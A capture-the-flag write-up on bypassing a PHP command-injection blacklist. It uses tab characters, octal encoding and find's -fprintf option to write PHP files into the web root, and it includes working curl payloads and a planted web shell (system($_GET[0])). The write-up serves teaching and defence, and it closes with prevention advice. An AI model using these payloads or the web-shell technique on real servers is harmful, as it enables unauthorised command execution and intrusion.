
# FaaS-Dist CTF Writeup

## Overview
This challenge involves a PHP web application with command injection vulnerability. The application has strict input filters but can be bypassed using `find` command's `-fprintf` option to write PHP files.

## Vulnerability Analysis

The `index.php` file contains a command injection vulnerability:
```php
$cmd = $_GET['cmd'];
// ... blacklist checks ...
$cmd = "find " . $cmd;
system($cmd);
```

### The Problem
The application takes user input via the `cmd` parameter and prepends it with `find ` before executing it via `system()`. This creates a command injection vulnerability where we can control part of the command being executed.

### Blacklist Analysis
The application attempts to prevent command injection by blacklisting dangerous characters:
```php
if (strpos($cmd, ";") !== False || strpos($cmd, "|") !== False || strpos($cmd, "$") !== False ||
    strpos($cmd, "`") !== False || strpos($cmd, "&") !== False || strpos($cmd, "\n") !== False ||
    strpos($cmd, ">") !== False || strpos($cmd, "<") !== False || strpos($cmd, "(") !== False ||
    strpos($cmd, ")") !== False || strpos($cmd, " ") !== False || strpos($cmd, "\r") !== False ||
    strpos($cmd, "+") !== False || strpos($cmd, "{") !== False || strpos($cmd, "}") !== False ||
    strpos($cmd, "[") !== False || strpos($cmd, "]") !== False) {
    die("Bad bad hacker :<");
}
```

### Why the Blacklist Fails
The blacklist is comprehensive but misses several critical bypass techniques:
- **TAB characters (`%09`)**: Can replace spaces in many contexts
- **Octal encoding (`\040`, `\074`, etc.)**: Can represent blocked characters
- **`find` command options**: Like `-fprintf` which allows file writing
- **Character substitution**: Using alternatives like backticks instead of parentheses

### The Core Issue
The fundamental problem is that **blacklisting is inherently flawed** - it's impossible to anticipate all possible attack vectors. The application should use **whitelisting** or **parameterized commands** instead.

## Enumeration

### Initial Command Injection Test

```bash
curl 'http://localhost:8888/?cmd=/%09-maxdepth%091%09-ls'
# curl 'http://localhost:8888/?cmd=/	-maxdepth	1	-ls'
```

**Screenshot 1: Initial enumeration showing directory listing**

#### Why This Works
- **TAB Character Bypass**: We use `%09` (URL-encoded TAB) instead of spaces because spaces are blacklisted
- **Find Command Structure**: The command becomes `find / -maxdepth 1 -ls`
- **Directory Enumeration**: This lists the contents of the root directory with detailed information
- **Proof of Concept**: Confirms that our bypass technique works and we can execute find commands

### Checking Writable Directories

```bash
curl 'http://localhost:8888/?cmd=/var/www/html%09-maxdepth%091%09-writable%09-ls'
# curl 'http://localhost:8888/?cmd=/var/www/html	-maxdepth	1	-writable	-ls'
```

**Screenshot 2: Confirming write permissions in /var/www/html**

#### Why This Step is Critical
- **Write Permission Check**: We need to confirm we can write files to the web directory
- **Find -writable**: This find option only shows files/directories we have write access to
- **Web Directory Access**: `/var/www/html` is the web root where PHP files can be executed
- **Strategic Planning**: Once we confirm write access, we can plan our file-based attack

## Exploitation

### Method 1: Direct Flag Execution

```bash
curl 'http://localhost:8888/?cmd=.%09-maxdepth%090%09-fprintf%09p.php%09'\074\077php\040passthru\050\042/readflag\040i\040want\040the\040flag\040please\042\051\073\040\077\076'
```

**Screenshot 3: Writing PHP file with direct flag execution**

Then access: `http://localhost:8888/p.php`

**Screenshot 4: Flag displayed after accessing p.php**

#### How This Method Works
- **Find -fprintf**: Writes formatted output to a file (in this case, our PHP file)
- **Octal Encoding**: `\074\077` = `<?`, `\040` = space, `\050\051` = `()`, `\042` = `"`, `\073` = `;`, `\076` = `>`
- **Decoded PHP**: The file contains `<?php passthru("/readflag i want the flag please"); ?>`
- **Direct Execution**: When accessed via web server, PHP executes the command and displays the flag
- **Two-Stage Attack**: First write the file, then access it to execute the payload

### Method 2: PHP Shell Creation

```bash
curl 'http://localhost:8888/?cmd=/%09-fprintf%09shell.php%09\042\\74?php\040system\\50\\44_GET\\1330\\135\\51\\73\042%09-quit'
```

**Screenshot 5: Creating PHP shell**

Then access: `http://localhost:8888/shell.php?0=/readflag%20i%20want%20the%20flag%20please`

**Screenshot 6: Flag via PHP shell**

#### How This Method Works
- **PHP Shell Creation**: Creates a more flexible PHP shell that accepts commands via GET parameters
- **Octal Encoding**: `\\74` = `<`, `\\50` = `(`, `\\44` = `$`, `\\133` = `[`, `\\135` = `]`, `\\51` = `)`
- **Decoded PHP**: The file contains `<?php system($_GET[0]); ?>`
- **Parameterized Execution**: We pass the command as a GET parameter (`?0=/readflag%20i%20want%20the%20flag%20please`)
- **Flexibility**: This method allows us to execute any command by changing the GET parameter
- **URL Encoding**: We use `%20` for spaces in the URL since we're passing it as a parameter

### Method 3: Using Backticks

```bash
curl 'http://localhost:8888/?cmd=/%09-maxdepth%090%09-fprintf%09/var/www/html/p.php%09'\074\077php\040echo\040\140/readflag\040i\040want\040the\040flag\040please\140\073\040\077\076'
```

**Screenshot 7: Alternative method using backticks**

#### How This Method Works
- **Backtick Execution**: Uses backticks (`\140`) instead of parentheses to execute commands
- **Echo Output**: Uses `echo` to display the command output
- **Octal Encoding**: `\074\077` = `<?`, `\040` = space, `\140` = backtick, `\073` = `;`, `\076` = `>`
- **Decoded PHP**: The file contains `<?php echo `/readflag i want the flag please`; ?>`
- **Alternative Syntax**: Demonstrates that there are multiple ways to execute commands in PHP
- **Full Path**: Uses the full path `/var/www/html/p.php` to ensure the file is written to the correct location

## Key Techniques Used

### 1. TAB Character Substitution
- **Why**: Spaces are blacklisted in the input filter
- **How**: Use `%09` (URL-encoded TAB) instead of spaces
- **Result**: TAB characters work as separators in most command contexts

### 2. Octal Encoding
- **Why**: Many special characters are blacklisted (`<`, `>`, `(`, `)`, `$`, `[`, `]`)
- **How**: Use octal representations like `\040` (space), `\074` (`<`), `\076` (`>`)
- **Result**: Bypass character filters while maintaining functionality

### 3. Find -fprintf File Writing
- **Why**: Direct command execution is blocked by filters
- **How**: Use `find -fprintf filename "data"` to write arbitrary content to files
- **Result**: Create PHP files that can execute commands when accessed via web server

### 4. File-based Execution
- **Why**: Input filters prevent direct command injection
- **How**: Write PHP files to web directory, then access them via HTTP
- **Result**: Bypass input filters by using the web server to execute our payload

### 5. Multiple PHP Execution Methods
- **passthru()**: Direct command execution with output
- **system()**: Command execution with GET parameters for flexibility
- **Backticks**: Alternative syntax for command execution

## Flag
`QnQSec{test_flag_by_whale120}`

## Lessons Learned

### Security Implications
- **Blacklisting is insufficient**: Impossible to anticipate all attack vectors
- **Input validation**: Should use whitelisting or parameterized commands
- **Defense in depth**: Multiple layers of protection needed

### Attack Techniques
- **Character encoding**: Powerful bypass method for input filters
- **Indirect execution**: File writing can bypass direct command injection filters
- **Multiple payloads**: Different encoding methods provide redundancy

### Prevention Strategies
- **Whitelist allowed characters** instead of blacklisting dangerous ones
- **Use parameterized commands** or safe APIs instead of system() calls
- **Implement proper input validation** and output encoding
- **Regular security testing** to identify bypass techniques

